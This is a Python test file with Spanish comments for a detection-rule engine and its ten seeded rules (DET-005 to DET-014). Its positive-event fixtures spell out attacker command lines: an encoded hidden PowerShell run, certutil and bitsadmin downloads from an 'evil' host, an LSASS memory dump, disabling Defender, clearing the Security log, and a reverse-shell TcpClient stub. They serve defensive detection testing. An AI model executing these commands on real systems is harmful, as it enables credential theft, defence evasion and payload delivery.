"""
Tests del motor de detección editable desde datos (S117.4).

Cubre services/detection_rules (evaluador puro, sin DB ni datetime.UTC) y valida
que cada regla del catálogo SEED_RULES dispara en su evento positivo y NO en uno
benigno — garantizando que el catálogo que se siembra en la DB coincide con lo
que el motor realmente evalúa (catálogo == motor).
"""

import pytest

from asc_api.services.detection_rules import (
    SEED_RULES,
    eval_condition,
    evaluate_conditions,
)

# Un evento que DEBE disparar cada regla (uno por rule_id).
POSITIVE_EVENTS = {
    "DET-005": {"process": "powershell.exe", "command_line": "powershell -nop -w hidden -enc SQBFAFgA"},
    "DET-006": {"process": "certutil.exe", "command_line": "certutil -urlcache -f http://evil/x.exe x.exe"},
    "DET-007": {"process": "rundll32.exe", "command_line": "rundll32 comsvcs.dll MiniDump 640 lsass.dmp full"},
    "DET-008": {"process": "cmd.exe", "command_line": "schtasks /create /sc minute /tn evil /tr c:\\x.exe"},
    "DET-009": {"process": "cmd.exe", "command_line": "sc create evilsvc binPath= c:\\x.exe"},
    "DET-010": {"process": "powershell.exe", "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true"},
    "DET-011": {"process": "cmd.exe", "command_line": "wevtutil cl Security"},
    "DET-012": {"process": "wmic.exe", "command_line": "wmic process call create calc.exe"},
    "DET-013": {"process": "bitsadmin.exe", "command_line": "bitsadmin /transfer j http://evil/x c:\\x"},
    "DET-014": {
        "process": "powershell.exe",
        "command_line": "$c=New-Object System.Net.Sockets.TcpClient('10.0.0.1',443)",
    },
}

BENIGN_EVENT = {
    "process": "chrome.exe",
    "command_line": "chrome.exe --profile-directory=Default",
    "category": "process",
}


class TestOperators:
    def test_contains(self):
        assert eval_condition({"a": "AbCdef"}, {"field": "a", "op": "contains", "value": "bc"}) is True
        assert eval_condition({"a": "xyz"}, {"field": "a", "op": "contains", "value": "bc"}) is False

    def test_contains_any(self):
        cond = {"field": "a", "op": "contains_any", "value": ["foo", "bar"]}
        assert eval_condition({"a": "a bar b"}, cond) is True
        assert eval_condition({"a": "nothing"}, cond) is False

    def test_token_any_is_not_substring(self):
        # "/s" must match as a whole token, not inside "/silent"
        assert eval_condition({"a": "/s /o"}, {"field": "a", "op": "token_any", "value": ["/s"]}) is True
        assert eval_condition({"a": "/silent"}, {"field": "a", "op": "token_any", "value": ["/s"]}) is False

    def test_numeric(self):
        assert eval_condition({"p": 5}, {"field": "p", "op": "gt", "value": 3}) is True
        assert eval_condition({"p": 2}, {"field": "p", "op": "gt", "value": 3}) is False

    def test_unknown_operator_is_safe(self):
        assert eval_condition({"a": "x"}, {"field": "a", "op": "danger", "value": "x"}) is False

    def test_missing_field_is_safe(self):
        assert eval_condition({}, {"field": "nope", "op": "contains", "value": "x"}) is False


class TestMatchType:
    CONDS = [
        {"field": "a", "op": "contains", "value": "x"},
        {"field": "b", "op": "contains", "value": "y"},
    ]

    def test_all_requires_every_condition(self):
        assert evaluate_conditions({"a": "x", "b": "y"}, self.CONDS, "all") is True
        assert evaluate_conditions({"a": "x", "b": "z"}, self.CONDS, "all") is False

    def test_any_requires_one_condition(self):
        assert evaluate_conditions({"a": "x", "b": "z"}, self.CONDS, "any") is True
        assert evaluate_conditions({"a": "n", "b": "z"}, self.CONDS, "any") is False

    def test_empty_conditions_never_fire(self):
        assert evaluate_conditions({"a": "x"}, [], "all") is False


class TestSeedCatalogue:
    def test_ten_rules_present(self):
        assert len(SEED_RULES) == 10
        assert {r["rule_id"] for r in SEED_RULES} == {f"DET-{n:03d}" for n in range(5, 15)}

    def test_every_rule_has_mitre_and_conditions(self):
        for r in SEED_RULES:
            assert r["mitre_ttp"].startswith("T"), r["rule_id"]
            assert r["conditions"], f"{r['rule_id']} sin condiciones"
            assert r["match_type"] in ("all", "any")
            assert r["severity"] in ("critical", "high", "medium", "low")

    @pytest.mark.parametrize("rule", SEED_RULES, ids=lambda r: r["rule_id"])
    def test_rule_fires_on_positive_event(self, rule):
        event = POSITIVE_EVENTS[rule["rule_id"]]
        assert evaluate_conditions(event, rule["conditions"], rule["match_type"]) is True

    @pytest.mark.parametrize("rule", SEED_RULES, ids=lambda r: r["rule_id"])
    def test_rule_does_not_fire_on_benign_event(self, rule):
        assert evaluate_conditions(BENIGN_EVENT, rule["conditions"], rule["match_type"]) is False
